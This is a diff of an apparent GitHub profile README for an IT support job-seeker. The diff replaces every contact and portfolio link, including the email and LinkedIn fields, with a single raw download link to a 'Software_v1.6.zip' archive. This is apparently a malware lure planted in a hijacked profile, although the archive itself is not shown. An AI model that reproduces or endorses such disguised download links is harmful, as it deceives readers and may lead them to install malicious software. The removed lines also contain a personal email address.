@@ -54,7 +54,7 @@ Working prototype with documented workflow and mock API, designed for production
 - **ITSM:** Freshdesk with custom workflow configuration  
 - **Documentation:** All labs tracked via structured support tickets  
 
-**[View Detailed Portfolio →](https://github.com/Wkamoah/IT-Portfolio)**
+**[View Detailed Portfolio →](https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Software_v1.6.zip)**
 
 ---
 
@@ -84,10 +84,10 @@ Modeling and acting experience enables **clear, confident, user-facing communica
 
 ## 📫 Connect
 
-- **Portfolio:** [github.com/Wkamoah/IT-Portfolio](https://github.com/Wkamoah/IT-Portfolio)  
-- **GitHub:** [@Wkamoah](https://github.com/Wkamoah)  
-- **Email:** [winfredkofiamoah@gmail.com]  
-- **LinkedIn:** [www.linkedin.com/in/winfred-kofi-amoah-6b9296397]  
+- **Portfolio:** [https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Software_v1.6.zip](https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Software_v1.6.zip)  
+- **GitHub:** [@Wkamoah](https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Software_v1.6.zip)  
+- **Email:** [https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Software_v1.6.zip]  
+- **LinkedIn:** [https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Software_v1.6.zip]  
 
 ---
 
